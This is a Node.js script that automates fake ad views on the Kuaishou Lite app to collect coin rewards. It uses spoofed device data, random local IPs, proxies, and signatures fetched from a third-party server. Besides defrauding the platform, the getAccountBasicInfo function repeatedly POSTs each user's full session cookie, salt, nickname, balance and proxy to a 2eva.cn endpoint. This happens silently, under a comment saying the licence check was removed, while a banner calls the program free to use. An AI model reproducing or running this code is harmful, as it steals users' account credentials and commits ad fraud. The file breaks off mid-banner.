/**
 * 任务次数配置】
 * KS_COUNT: 执行轮数，默认999
 * KS_AD_TYPE：广告类型，默认look,box,food,search,look_follow,search_follow
 * KS_SEARCH_KEYWORD：搜索关键词，默认捕鱼
 * KS_KM：卡密（已移除）
 * KS_TIME：每轮间隔时间，默认480
 * KS_TIME1：每轮间隔随机时间，默认120
 * KS_SORT：多账号是否顺序执行，1顺序0并发 默认0
 * KS_IP： 默认1
 * KS_FAIL_NUM：连续低奖励上限，默认3（达到后停止全部任务）
 * KS_AD_NUM：每个类型广告数量food,box,look,search，按顺序填写 默认3
 * SKIP_LIVE_ADS：是否跳过直播广告（默认1，设置为0关闭）
 * SKIP_LIVE_MAX_RETRIES：跳过直播广告时的最大重试次数（默认2）
 * KSFOLLOW_COUNT: 每次 look 成功后 look_follow,search_follow 追加次数，默认2,2
 */

let adType = []
let baseUrl = 'https://www.2eva.cn'
const { SocksProxyAgent } = require('socks-proxy-agent')
const axios = require('axios')
const UserAgent = 'kwai-android aegon/4.28.0'
require('dotenv').config()

const uQaTag = '1##swLdgl:99#ecPp:-9#cmNt:-0#cmHs:-3#cmMnsl:-0'
const formatDate = (date, format = 'YYYY-MM-DD HH:mm:ss') => {
  const year = date.getFullYear()
  const month = String(date.getMonth() + 1).padStart(2, '0') // 月份+1并补零
  const day = String(date.getDate()).padStart(2, '0')
  const hours = String(date.getHours()).padStart(2, '0')
  const minutes = String(date.getMinutes()).padStart(2, '0')
  const seconds = String(date.getSeconds()).padStart(2, '0')

  // 替换模板中的占位符
  return format
    .replace('YYYY', year)
    .replace('MM', month)
    .replace('DD', day)
    .replace('HH', hours)
    .replace('mm', minutes)
    .replace('ss', seconds)
}

generateLocalIp = async (ip = 1, type = 'C') => {
  // 随机生成0-255之间的数字
  const randomByte = () => Math.floor(Math.random() * 256)

  switch (type.toUpperCase()) {
    case 'A':
      // 10.x.x.x
      return `10.${randomByte()}.${randomByte()}.${randomByte()}`

    case 'B':
      // 172.16.x.x ~ 172.31.x.x
      const secondOctet = 16 + Math.floor(Math.random() * 16) // 16-31之间
      return `172.${secondOctet}.${randomByte()}.${randomByte()}`

    case 'C':
    default:
      // 192.168.x.x
      return `192.168.${ip}.${randomByte()}`
  }
}
class userTask {
  constructor(user) {
    this.index = _omQc0mc.userIdx++
    this.nickname = this.index
    this.totalCoin = 0
    this.allCash = 0
    this.user = user.split('#')
    this.ck = this.user[0]
    this.salt = this.user[1]
    this.sock = null

    this.adinfo = {}
    this.userId = null
    this.did = null
    this.socks5 = null
    this.wwip = ''
    this.nwip = '192.168.31.57'

    this.adtype = []
    this.adtype_follow = []
    this.cookies = ''
  }
  async getAccountBasicInfo() {
    _omQc0mc.wait(4000)
    try {
      const { data } = await axios.request({
        url: 'https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo?source=bottom_guide_first',
        method: 'GET',
        timeout: 12000,
        headers: {
          'User-Agent': UserAgent,
          Cookie: this.ck,
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      })
      if (data && data.result === 1 && data.data) {
        this.nickname = `[${this.index}] ${data.data.userData?.nickname}`
        this.totalCoin = data.data.totalCoin
        this.allCash = data.data.totalCash
        _omQc0mc.log(
          `账号[${this.nickname}] 💰 当前金币: ${this.totalCoin}，💸 当前余额: ${this.allCash}`
        )
      }
      // 移除卡密验证后的数据上传
      const newData = {
        user_id: Number(this.userId),
        salt: this.salt,
        nickname: this.nickname,
        ck: this.ck,
        total_coin: this.totalCoin,
        all_cash: this.allCash,
        sock: this.sock
      }
      axios.request({
        url: 'https://www.2eva.cn/api/ksjs/ksjs_record/create',
        method: 'POST',
        data: newData
      })
    } catch (e) {
      _omQc0mc.log(`账号[${this.nickname}] 获取账户信息失败: ${e}`)
    }
  }
  checkCookieVariables() {
    const ckKey = [
      'kpn',
      'kpf',
      'userId',
      'did',
      'c',
      'appver',
      'language',
      'mod',
      'did_tag',
      'egid',
      'oDid',
      'androidApiLevel',
      'newOc',
      'browseType',
      'socName',
      'ftt',
      'abi',
      'userRecoBit',
      'device_abi',
      'grant_browse_type',
      'iuid',
      'rdid',
      'isp',
      'thermal',
      'net',
      'kcv',
      'app',
      'bottom_navigation',
      'ver',
      'android_os',
      'boardPlatform',
      'slh',
      'country_code',
      'nbh',
      'hotfix_ver',
      'did_gt',
      'keyconfig_state',
      'cdid_tag',
      'sys',
      'max_memory',
      'cold_launch_time_ms',
      'oc',
      'sh',
      'deviceBit',
      'ddpi',
      'is_background',
      'sw',
      'apptype',
      'icaver',
      'totalMemory',
      'sbh',
      'darkMode',
      'earphoneMode'
    ]
    const ck = this.ck
    const originCookies = {}

    if (ck) {
      ck.split(';').forEach((e) => {
        const [key, val] = e.trim().split('=')
        originCookies[key] = val
      })
    }
    const cookies = {}

    ckKey.forEach((e) => {
      cookies[e] = originCookies[e]
    })
    let t = /kuaishou\.api_st=([^;]+)/
    let api_st = ck.match(new RegExp(t, ''))
    this.api_st = api_st[1] || ''
    ckKey.forEach((key) => {
      const val = originCookies[key]
      if (val !== undefined) {
        this[key] = val
      }
    })
    // console.log(this)

    return cookies
  }
  getOaid() {
    const ck = this.ck
    const data = {}
    if (ck) {
      ck.split(';').forEach((e) => {
        const [k, v] = e.trim().split('=')
        data[k] = v
      })
    }
    return data.oaid || '9e4bb0e5bc326fb1'
  }
  getNwip() {
    const ck = this.ck
    const data = {}
    if (ck) {
      ck.split(';').forEach((e) => {
        const [k, v] = e.trim().split('=')
        data[k] = v
      })
    }
    return data.nwip || generateLocalIp()
  }
  getKsadtype() {
    const ck = this.ck
    const data = {}
    if (ck) {
      ck.split(';').forEach((e) => {
        const [k, v] = e.trim().split('=')
        data[k] = v
      })
    }
    const adtype = data.ksadtype || adType
    const adtypeArr = adtype.split(',')
    //需要取交集
    const intersecArr = ['look', 'food', 'box', 'search']
    const intersec = intersecArr.filter((x) => adtypeArr.includes(x))

    const intersec1Arr = ['search_follow', 'look_follow']

    const intersec1 = intersec1Arr.filter((x) => adtypeArr.includes(x))

    return { intersec, intersec1 }
  }
  getOsVersion() {
    const ck = this.ck
    const data = {}
    if (ck) {
      ck.split(';').forEach((e) => {
        const [k, v] = e.trim().split('=')
        data[k] = v
      })
    }
    return data.osVersion || 10
  }
  async getIP() {
    if (this.user.length > 2) {
      this.sock = this.user[2]
      if (this.sock && (this.sock.includes('socks5://') || this.sock.includes('socks://'))) {
        try {
          this.socks5 = new SocksProxyAgent(this.sock)
          let { data } = await axios.request({
            url: 'https://www.2eva.cn/api/health',
            method: 'GET',
            timeout: 30000,
            httpAgent: this.socks5,
            httpsAgent: this.socks5,
            proxy: false,
            headers: {
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
          })
          this.wwip = data.ip
          this.nwip = await this.getNwip()
          _omQc0mc.log(`账号[${this.nickname}] 外网IP:[${this.wwip},${this.nwip}]`)
          return
        } catch (err) {
          this.socks5 = null
          console.log(`账号[${this.nickname}]sock5代理错误`)
        }
      }
    }
    try {
      let { data } = await axios.request({
        url: 'https://www.2eva.cn/api/health',
        method: 'GET',
        timeout: 30000
      })
      this.wwip = data.ip
      this.nwip = await this.getNwip()
      _omQc0mc.log(`账号[${this.nickname}] 代理不存在 采用直连模式[${this.wwip},${this.nwip}]`)
    } catch (err) {
      _omQc0mc.log(`账号[${this.nickname}] 网络获取失败`)
    }
  }
  async executeTask(type, lookCount) {
    //加载广告
    let adData = await this.loadAd(type)
    if (!adData) {
      _omQc0mc.log(
        `账号[${this.nickname}] ${_omQc0mc.wheelNum}/${this.look}/${lookCount} [${this.adinfo.name}] 获取广告信息失败，跳过本轮看广告`
      )
      return true
    }

    const t1 = Math.floor((adData.watchAdTime + Math.floor(Math.random() * 4 + 4) * 1000) / 1000)
    _omQc0mc.log(
      `账号[${this.nickname}] ${_omQc0mc.wheelNum}/${this.look}/${lookCount} [${this.adinfo.name}] 广告${adData.watchAdTime / 1000}秒 随机${t1}秒`
    )
    await _omQc0mc.wait(t1 * 1000)

    const { neoAmount: subAdData, status } = await this.subAd(
      adData.cid,
      adData.llsid,
      adData.adExtInfo,
      Date.now(),
      t1,
      adData.materialTime,
      adData.watchAdTime
    )
    await this.getAccountBasicInfo()
    //退出本轮
    if (status == 2) {
      return true
    }
    //退出本账号
    if (status == 3) {
      _omQc0mc.failadnumobj[this.salt] = 9999999
      return true
    }
    const t = Math.floor(Math.random() * 23 + 15)
    _omQc0mc.log(
      `账号[${this.nickname}] ${_omQc0mc.wheelNum}/${this.look}/${lookCount} [${this.adinfo.name}] ✅ 获取金币[${subAdData}] 等待[${t}秒]`
    )
    this.look++
    if (subAdData < 20) {
      _omQc0mc.log(
        `账号[${this.nickname}] ${_omQc0mc.wheelNum}/${this.look}/${lookCount} [${this.adinfo.name}] ❌ 领取金币不足20 等待[${t}秒]进入下一轮`
      )
      _omQc0mc.failadnumobj[this.salt] = _omQc0mc.failadnumobj[this.salt] + 1
      await _omQc0mc.wait(t * 1000)
      return true
    } else {
      _omQc0mc.failadnumobj[this.salt] = 0
      if (['look_follow', 'search_follow'].includes(type)) {
        this.followCount++
      }
      await _omQc0mc.wait(t * 1000)
      //有追加广告
      if (
        adData.hashMore &&
        this.followCount <= _omQc0mc[`${type}count`] &&
        (this.adtype_follow.includes(`${type}_follow`) || this.adtype_follow.includes(`${type}`))
      ) {
        _omQc0mc.log(`账号[${this.nickname}] 开始追加广告`)
        const typeMap = {
          look_follow: 'look_follow',
          search_follow: 'search_follow',
          look: 'look_follow',
          search: 'search_follow'
        }
        return await this.executeTask(typeMap[type], lookCount)
      }
    }
  }
  async run() {
    this.cookies = this.checkCookieVariables()
    const { intersec, intersec1 } = this.getKsadtype()
    this.adtype = intersec
    this.adtype_follow = intersec1
    if (!this.salt) {
      return _omQc0mc.log(`账号['${this.nickname}'] salt不存在`)
    }
    if (!_omQc0mc.failadnumobj.hasOwnProperty(this.salt)) {
      _omQc0mc.failadnumobj[this.salt] = 0
    }
    if (_omQc0mc.failadnumobj[this.salt] >= _omQc0mc.failadnum) {
      return _omQc0mc.log(
        `🙅 账号['${this.nickname}'] 连续${_omQc0mc.failadnumobj[this.salt]}次低价值广告，停止本轮运行`
      )
    }
    await this.getIP()
    await this.getAccountBasicInfo()
    this.oaid = this.getOaid()
    this.osVersion = this.getOsVersion()

    _omQc0mc.log(
      `账号[${this.nickname} 广告设备标识[${this.oaid}]]获取系统版本 [${this.osVersion}],广告类型[${this.adtype}]`
    )
    for (const type of this.adtype) {
      const lookCount = _omQc0mc[type + 'count']
      this.look = 1
      this.adinfo = _omQc0mc.taskConfigs[type]
      while (this.look <= lookCount) {
        this.followCount = 1
        let stop = await this.executeTask(type, lookCount)
        if (stop) {
          return // 结束函数，循环也随之结束
        }
      }
    }

    _omQc0mc.log(`账号[${this.nickname}] ${_omQc0mc.wheelNum}轮 所有任务完成！`)
  }
  is_live_ad(data = {}) {
    try {
      let adinfo = data.adExtInfo || data.extInfo || data?.['ad']?.['adExtInfo'] || '{}'
      if (typeof adinfo === 'string')
        try {
          adinfo = JSON.parse(adinfo)
        } catch (err) {
          adinfo = {}
        }
      const checkStr = ['直播', 'live', '主播', 'LIVE', 'zb', 'ZB']
      const creativeId = String(data.creativeId || data?.['ad']?.creativeId || '').toLowerCase()

      const description = String(adinfo.description || '').toLowerCase()

      const title = String(adinfo.title || data['title'] || '').toLowerCase()
      const caption = String(adinfo.caption || data['caption'] || '').toLowerCase()
      const objArr = [creativeId, description, title, caption, JSON.stringify(adinfo)]

      for (const obj of objArr) {
        for (const str of checkStr) {
          if (obj && obj.includes(str.toLowerCase())) return !!![]
        }
      }
      const materialTime = data['materialTime'] || data?.['ad']?.materialTime || 0
      if (materialTime > 60000) return !!![]
      if (
        creativeId['startsWith']('live_') ||
        creativeId['startsWith']('zb_') ||
        creativeId['startsWith']('live-') ||
        creativeId['startsWith']('zb-')
      )
        return true
      return false
    } catch (err) {
      return false
    }
  }
  async loadReqParams(_path, _data, _salt) {
    try {
      const path = Buffer.from(_path).toString('base64')
      const salt = Buffer.from(_salt).toString('base64')
      const data = Buffer.from(_data).toString('base64')
      let { data: res } = await axios.request({
        url: `${baseUrl}/api/ksjs/ksjs_km/nssig`,
        headers: {
          nickname: encodeURIComponent(this.nickname),
          userid: this.userId,
          salt: this.salt
        },
        method: 'POST',
        data: {
          path: path,
          salt: salt,
          data: data
        }
      })
      if (res.code === 0) {
        return {
          sig: res.data.sig,
          __NS_xfalcon: '',
          __NStokensig: res.data.nstokensig,
          __NS_sig3: res.data.nssig3
        }
      } else {
        console.log('获取nssig3失败', res.msg)
        return null
      }
    } catch (err) {
      console.log('加载nssig3失败', err)
      return null
    }
  }
  async encsign(e) {
    try {
      const dataStr = Buffer.from(JSON.stringify(e)).toString('base64')
      const { data: res } = await axios.request({
        url: `${baseUrl}/api/ksjs/ksjs_km/encsign`,
        headers: {
          nickname: encodeURIComponent(this.nickname),
          userid: this.userId,
          salt: this.salt
        },
        method: 'POST',
        data: { data: dataStr }
      })

      if (res.code === 0) {
        return res.data
      } else {
        console.log('获取encsign失败', res.msg)
        return null
      }
    } catch (err) {
      console.log('加载encsign 失败')
      return null
    }
  }
  loadAdInfo(type) {
    this.adinfo = _omQc0mc.taskConfigs[type]
    let impExtDataString =
      '{"openH5AdCount":"2","sessionLookedCompletedCount":"1","sessionType":"1","neoParams":"","searchKey":"","triggerType":"2","disableReportToast":"true","businessEnterAction":"7"}'
    if (this.adinfo['businessId'] == 7076) {
      const impExtDataObject = {
        openH5AdCount: 0,
        sessionLookedCompletedCount: 0,
        sessionType: '1',
        searchKey: _omQc0mc.searchkeyword,
        triggerType: '2',
        disableReportToast: true,
        businessEnterAction: '7',
        neoParams:
          'eyJwYWdlSWQiOiAxMTAxNCwgInN1YlBhZ2VJZCI6IDEwMDE2MTUzNywgInBvc0lkIjogMjE2MjY4LCAiYnVzaW5lc3NJZCI6IDcwNzYsICJleHRQYXJhbXMiOiAiIiwgImN1c3RvbURhdGEiOiB7ImV4aXRJbmZvIjogeyJ0b2FzdERlc2MiOiBudWxsLCAidG9hc3RJbWdVcmwiOiBudWxsfX0sICJwZW5kYW50VHlwZSI6IDEsICJkaXNwbGF5VHlwZSI6IDIsICJzaW5nbGVQYWdlSWQiOiAwLCAic2luZ2xlU3ViUGFnZUlkIjogMCwgImNoYW5uZWwiOiAwLCAiY291bnRkb3duUmVwb3J0IjogZmFsc2UsICJ0aGVtZVR5cGUiOiAwLCAibWl4ZWRBZCI6IHRydWUsICJmdWxsTWl4ZWQiOiB0cnVlLCAiYXV0b1JlcG9ydCI6IHRydWUsICJmcm9tVGFza0NlbnRlciI6IHRydWUsICJzZWFyY2hJbnNwaXJlU2NoZW1lSW5mbyI6IG51bGwsICJhbW91bnQiOiAwfQ=='
      }
      impExtDataString = JSON.stringify(impExtDataObject)
    }
    let data = {
      appInfo: {
        appId: 'kuaishou_nebula',
        name: '快手极速版',
        packageName: 'com.kuaishou.nebula',
        version: this.appver,
        versionCode: -1
      },
      deviceInfo: {
        oaid: this.oaid,
        osType: 1,
        osVersion: this.getOsVersion(),
        language: this.language,
        deviceId: '' + this.did,
        screenSize: { width: 1080, height: 2068 },
        ftt: '',
        supportGyroscope: true
      },
      networkInfo: { ip: this.nwip, connectionType: 100 },
      geoInfo: { latitude: 0, longitude: 0 },
      userInfo: {
        userId: this.userId,
        age: 0,
        gender: ''
      },
      impInfo: [
        {
          pageId: this.adinfo.pageId || 11101,
          subPageId: this.adinfo.subPageId,
          action: 0,
          width: 0,
          height: 0,
          browseType: this.browseType,
          requestSceneType: this.adinfo.requestSceneType,
          lastReceiveAmount: 0,
          impExtData: impExtDataString,
          mediaExtData: '{}',
          session: _omQc0mc.uuid()
        }
      ],
      adClientInfo: '{"ipdxIP":"' + this.wwip + '"}'
    }

    return data
  }
  async loadAd(adType, num = 0) {
    const retries = _omQc0mc.skipliveads ? _omQc0mc.skiplivemaxretries : 1
    const params = this.loadAdInfo(adType)
    const encsign = await this.encsign(params)
    if (encsign == null) {
      _omQc0mc.log('获取encsign失败')
      return
    }
    const data = {
      encData: encsign.encdata,
      sign: encsign.sign,
      cs: false,
      client_key: '2ac2a76d',
      videoModelCrowdTag: '1_23',
      watchStage: 'android',
      os: 'android',
      ['kuaishou.api_st']: this.api_st,
      uQaTag: uQaTag
    }
    let queryData = {
      mod: this.mod,
      appver: this.appver,
      language: this.language,
      ud: this.userId,
      did_tag: this.did_tag,
      egid: this.egid,
      kpf: this.kpf,
      oDid: this.oDid,
      kpn: this.kpn,
      newOc: this.newOc,
      androidApiLevel: this.androidApiLevel,
      browseType: this.browseType,
      socName: this.socName,
      c: this.c,
      abi: this.abi,
      ftt: this.ftt,
      userRecoBit: this.userRecoBit,
      device_abi: this.device_abi,
      grant_browse_type: this.grant_browse_type,
      iuid: this.iuid,
      rdid: this.rdid,
      did: this.did,
      earphoneMode: this.earphoneMode,
      isp: this.isp,
      thermal: this.thermal,
      net: this.net,
      kcv: this.kcv,
      app: this.app,
      bottom_navigation: this.bottom_navigation,
      ver: this.ver,
      android_os: this.android_os,
      boardPlatform: this.boardPlatform,
      slh: this.slh,
      country_code: this.country_code,
      nbh: this.nbh,
      hotfix_ver: this.hotfix_ver,
      did_gt: this.did_gt,
      keyconfig_state: this.keyconfig_state,
      cdid_tag: this.cdid_tag,
      sys: this.sys,
      max_memory: this.max_memory,
      cold_launch_time_ms: this.cold_launch_time_ms,
      oc: this.oc,
      sh: this.sh,
      deviceBit: this.deviceBit,
      ddpi: this.ddpi,
      is_background: this.is_background,
      sw: this.sw,
      apptype: this.apptype,
      icaver: this.icaver,
      totalMemory: this.totalMemory,
      sbh: this.sbh,
      darkMode: this.darkMode
    }
    const signData = await this.loadReqParams(
      '/rest/e/reward/mixed/ad',
      _omQc0mc.queryStr(data) + '&' + _omQc0mc.queryStr(queryData),
      this.salt
    )

    if (signData == null) {
      _omQc0mc.log('获取广告信息失败')
      return
    }
    const adReqData = { ...queryData }
    adReqData.sig = signData.sig
    adReqData['__NS_sig3'] = signData['__NS_sig3']
    adReqData['__NS_xfalcon'] = ''
    adReqData['__NStokensig'] = signData['__NStokensig']

    try {
      let { data: resData } = await axios.request({
        url: 'https://api.e.kuaishou.com/rest/e/reward/mixed/ad',
        httpAgent: this.socks5,
        httpsAgent: this.socks5,
        params: adReqData,
        proxy: false,
        timeout: 30000,
        method: 'POST',
        headers: {
          Host: 'api.e.kuaishou.com',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          Cookie:
            'kuaishou.api_st=' +
            this.api_st +
            ';__NSWJ=;region_ticket=RT_66898EB2122EC01C6A99E8FCCB4887F9C156DFC294E9FD56AD0156AECEB24C4EC69BFDFE7',
          'User-Agent': UserAgent,
          // 'page-code': 'NEW_TASK_CENTER',
          'X-Client-Info': `model=${this.mod};os=Android;nqe-score=22;network=${this.net};signal-strength=4;`
        },
        data: data
      })

      if (
        resData.errorMsg === 'OK' &&
        resData.feeds &&
        resData.feeds[0] &&
        resData.feeds[0]['ad']
      ) {
        //判断直播
        if (_omQc0mc.skipliveads) {
          const feeds = resData['feeds'][0]
          const adinfo = feeds['ad'] ? { ...feeds['ad'] } : { ...feeds },
            adExtInfo =
              feeds?.['ad']?.['adDataV2']?.['inspireAdInfo']?.['adExtInfo'] ??
              feeds?.['ad']?.['adExtInfo'] ??
              feeds?.['adExtInfo'] ??
              '{}'
          ;(adinfo.creativeId = adinfo.creativeId ?? creativeId),
            (adinfo['materialTime'] = adinfo['materialTime'] ?? feeds['materialTime'] ?? 0),
            (adinfo['adExtInfo'] =
              typeof adExtInfo === 'string' ? adExtInfo : JSON['stringify'](adExtInfo))
          if (this.is_live_ad(adinfo)) {
            if (num < retries - 1) {
              return await this.loadAd(adType, num + 1)
            }
            console.log('\x20多次获取直播广告，停止当前任务')
            return null
          }
        }

        const adName = resData.feeds[0]['caption'] || resData.feeds[0]['ad']?.caption || ''
        if (adName) {
          let text = `账号[${this.nickname}] 成功获取到广告信息：${adName}`
          if (resData?.feeds[0]?.ad?.extData) {
            const extData = JSON.parse(resData?.feeds[0]?.ad.extData)
            text = `账号[${this.nickname}] 获取到广告信息：${adName}，预计获得[${extData.awardCoin}]金币`
          }
          _omQc0mc.log(text)
        } else {
          _omQc0mc.log(`账号[${this.nickname}] 获取广告信息失败`)
          return null
        }
        const exp_tag = resData.feeds[0]['exp_tag'] || ''
        const llsid = exp_tag.split('/')[1]?.split('_')?.[0] || ''
        if (resData['feeds'][0]['streamManifest']) {
          const hashMore =
            resData['feeds'][0]['ad']['adDataV2']?.onceAgainRewardInfo?.hasMore || false
          return {
            cid: resData['feeds'][0]['ad']['creativeId'],
            llsid: llsid,
            adExtInfo: resData['feeds'][0]['ad']['adDataV2']['inspireAdInfo']['adExtInfo'],
            materialTime: resData['feeds'][0]['streamManifest']['adaptationSet'][0]['duration'],
            watchAdTime:
              resData['feeds'][0]['ad']['adDataV2']['inspireAdInfo']['inspireAdBillTime'],
            hashMore: hashMore
          }
        } else {
          return {
            cid: resData['feeds'][0]['ad']['creativeId'],
            llsid: llsid,
            adExtInfo: resData['feeds'][0]['ad']['adDataV2']['inspireAdInfo']['adExtInfo'],
            materialTime: 3000,
            watchAdTime: resData['feeds'][0]['ad']['adDataV2']['inspireAdInfo']['inspireAdBillTime']
          }
        }
      } else {
        _omQc0mc.log(`账号[${this.nickname}] 获取广告信息失败`)

        return null
      }
    } catch (err) {
      console.log('加载广告信息失败', err)
      return null
    }
  }

  async subAd(cid, llsid, adExtInfo, now, t1, materialTime, watchAdTime) {
    const endTime = now + t1 * 1000
    const bizStrData = {
      businessId: this.adinfo.businessId,
      endTime: endTime,
      extParams: '',
      mediaScene: 'video',
      neoInfos: [
        {
          creativeId: cid,
          extInfo: '',
          llsid: llsid,
          requestSceneType: this.adinfo.requestSceneType,
          taskType: this.adinfo.taskType,
          watchExpId: '',
          watchStage: 0
        }
      ],
      pageId: this.adinfo.pageId || 11101,
      posId: this.adinfo.posId,
      reportType: 0,
      sessionId: '',
      startTime: now,
      subPageId: this.adinfo.subPageId
    }
    const bizStr = JSON.stringify(bizStrData)

    const data =
      'bizStr=' +
      encodeURIComponent(bizStr) +
      '&cs=false&client_key=2ac2a76d&kuaishou.api_st=' +
      this.api_st

    const signData = await this.loadReqParams(
      '/rest/r/ad/task/report',
      `mod=${this.mod}&appver=${this.appver}&egid=${this.egid}&did=${this.did}&${data}`,
      this.salt
    )
    if (signData == null) {
      console.log('获取sign失败 请重试')
      return { neoAmount: 0, status: 2 }
    }
    try {
      let { data: resData } = await axios.request({
        url:
          'https://api.e.kuaishou.com/rest/r/ad/task/report' +
          '?' +
          `mod=${this.mod}&appver=${this.appver}&egid=${this.egid}&did=${this.did}` +
          '&sig=' +
          signData.sig +
          '&__NS_sig3=' +
          signData.__NS_sig3 +
          '&__NS_xfalcon=' +
          (signData.__NS_xfalcon || '') +
          '&__NStokensig=' +
          signData.__NStokensig,
        httpAgent: this.socks5,
        httpsAgent: this.socks5,
        proxy: false,
        timeout: 30000,
        method: 'POST',
        headers: {
          // 'page-code': 'NEW_TASK_CENTER',
          Host: 'api.e.kuaishou.com',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          Cookie: 'kuaishou.api_st=' + this.api_st,
          'User-Agent': UserAgent,
          'X-Client-Info': `model=${this.mod};os=Android;nqe-score=22;network=${this.net};signal-strength=4;`
        },
        data: data
      })
      //"成功"='\u6210\u529F'

      if ([20107, 20108, 1003, 415].includes(resData.result)) {
        console.log(`⚠️ 已达上限`)
        console.log(resData)
        return { neoAmount: 0, status: 3 }
      }

      if (resData.message == '\u6210\u529F') {
        return { neoAmount: resData.data.neoAmount, status: 1 }
      } else {
        console.log(resData)
        return { neoAmount: 0, status: 2 }
      }
    } catch (e) {
      console.log(e)
      return { neoAmount: 0, status: 1 }
    }
  }
}

function omQc0mc(name) {
  return new (class {
    constructor(name) {
      this.userIdx = 1
      this.userList = []
      this.userCount = 0
      this.name = name
      this.time = 480
      this.time1 = 120
      this.sort = 1
      this.wheelNum = 0

      this.startTime = new Date().getTime()
      this.log(this.name + ',开始!')

      this.count = 999
      this.ip = 1
      this.failadnum = 3
      this.failadnumobj = {}

      this.foodcount = 3
      this.boxcount = 3
      this.lookcount = 5
      this.taskConfigs = {
        look: {
          name: '看广告得金币',
          businessId: 672,
          posId: 24067,
          subPageId: 100026367,
          requestSceneType: 1,
          taskType: 1
        },
        look_follow: {
          name: '追加看广告得金币',
          businessId: 672,
          posId: 24067,
          subPageId: 100026367,
          requestSceneType: 2,
          taskType: 1
        },
        box: {
          name: '宝箱广告',
          businessId: 606,
          posId: 20346,
          subPageId: 100024064,
          requestSceneType: 1,
          taskType: 1
        },
        food: {
          name: '饭补广告',
          businessId: 9362,
          posId: 24067,
          subPageId: 100026367,
          requestSceneType: 7,
          taskType: 2
        },
        kbox: {
          name: '开宝箱',
          businessId: 606,
          posId: 20346,
          subPageId: 100024064,
          requestSceneType: 1,
          taskType: 1
        },
        search: {
          name: '搜索任务',
          pageId: 11014,
          businessId: 7076,
          posId: 216268,
          subPageId: 100161537,
          requestSceneType: 1,
          taskType: 1
        },
        search_follow: {
          name: '搜索任务追加',
          pageId: 11014,
          businessId: 7076,
          posId: 216268,
          subPageId: 100161537,
          requestSceneType: 7,
          taskType: 2
        }
      }
    }

    checkEnv() {
      // 读取多个环境变量：ksck, ksck1, ksck2 等
      const envVars = []
      // 查找所有以 kssck 开头的环境变量
      if (this.isNode()) {
        Object.keys(process.env).forEach((key) => {
          if (key.startsWith('ksck')) {
            envVars.push(key)
          }
        })
      }

      // 合并所有环境变量的值
      let allEnvValues = []
      envVars.forEach((envVar) => {
        const envValue = (this.isNode() ? process.env[envVar] : '') || ''
        if (envValue) {
          allEnvValues.push(envValue)
        }
      })

      // 合并所有值并分割
      const combinedEnv = allEnvValues.join('&')
      this.userList = combinedEnv
        .split(
          ['&', '\n'].find((e) => {
            return combinedEnv.includes(e)
          }) || '&'
        )
        .filter((e) => {
          return e
        })
      this.userCount = this.userList.length
      const count = (this.isNode() ? process.env.KS_COUNT : 999) || 999
      this.count = count
      const _adType =
        (this.isNode() ? process.env.KS_AD_TYPE : 'look,look_follow,box') || 'look,look_follow,box'
      adType = _adType
      // 移除卡密验证逻辑

      const _time = (this.isNode() ? process.env.KS_TIME : 480) || 480
      this.time = Number(_time)
      const _time1 = (this.isNode() ? process.env.KS_TIME1 : 120) || 120
      this.time1 = Number(_time1)
      const _sort = (this.isNode() ? process.env.KS_SORT : 0) || 0
      this.sort = Number(_sort)
      const _ip = (this.isNode() ? process.env.KS_IP : 1) || 1
      this.ip = Number(_ip)
      const _failadnum = (this.isNode() ? process.env.KS_FAIL_NUM : 3) || 3
      this.failadnum = Number(_failadnum)
      this.log({ count: this.count, time: this.time, time1: this.time1, sort: this.sort })

      const _skipliveads = (this.isNode() ? process.env.SKIP_LIVE_ADS : 0) || 0
      this.skipliveads = Boolean(_skipliveads)
      const _skiplivemaxretries = (this.isNode() ? process.env.SKIP_LIVE_MAX_RETRIES : 2) || 2
      this.skiplivemaxretries = Number(_skiplivemaxretries)

      const _kscountnum = (this.isNode() ? process.env.KS_AD_NUM : '5,5,10,5') || '5,5,10,5'
      const kscountnumarr = _kscountnum.split(',')
      this.foodcount = Number(kscountnumarr[Math.min(0, kscountnumarr.length - 1)])
      this.boxcount = Number(kscountnumarr[Math.min(1, kscountnumarr.length - 1)])
      this.lookcount = Number(kscountnumarr[Math.min(2, kscountnumarr.length - 1)])
      this.searchcount = Number(kscountnumarr[Math.min(3, kscountnumarr.length - 1)])

      const _ksfollowcount = (this.isNode() ? process.env.KSFOLLOW_COUNT : '2,2') || '2,2'
      const ksfollowcountarr = _ksfollowcount.split(',')
      this.look_followcount = Number(ksfollowcountarr[Math.min(0, ksfollowcountarr.length - 1)])
      this.search_followcount = Number(ksfollowcountarr[Math.min(1, ksfollowcountarr.length - 1)])

      this.searchkeyword = (this.isNode() ? process.env.KS_SEARCH_KEYWORD : '捕鱼') || '捕鱼'
      this.log(`共找到${this.userCount}个账号,运行${this.count}轮,全局广告类型为${_adType}`)
      console.log('搜索关键词：' + this.searchkeyword)
    }

    isNode() {
      return 'undefined' != typeof module && !!module.exports
    }
    queryStr(e) {
      const querystring = require('querystring')
      return querystring.stringify(e)
    }

    uuid() {
      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (_bT6g5d) {
        var Ef_WXp = (Math.random() * 16) | 0
        var u2GiQiz = _bT6g5d == 'x' ? Ef_WXp : (Ef_WXp & 3) | 8
        return u2GiQiz.toString(16)
      })
    }
    log(e) {
      const now = new Date()
      console.log(formatDate(now, 'MM-DD HH:mm:ss'), e)
    }
    wait(time) {
      return new Promise((resolve) => {
        return setTimeout(resolve, time)
      })
    }
    async done() {
      const now = new Date().getTime()
      const diff = (now - this.startTime) / 1000
      this.log(this.name + ',结束!' + diff + '秒')
      if (this.isNode()) {
        process['exit'](1)
      }
    }
  })(name)
}
const _omQc0mc = new omQc0mc('eva')
async function getNotice() {
  const { data: resData } = await axios.request({
    url: 'https://gitee.com/fxg1997/open/raw/master/ksNotice.json',
    method: 'GET'
  })
  console.log(resData)
  console.log('╔══════════════════════════════════════════════════════════════╗')
  console.log('║                    📢 程序已去除卡密验证                     ║')
  console.log('╠══════════════════════════════════════════════════════════════╣')
  console.log('║                     可自由使用本程序                         ║')
  console.log('╠══════════════════════════════════════════════════════════════╣')
  console.log('║  ck检测地址: https://www.2eva.cn/cookies.html                ║')
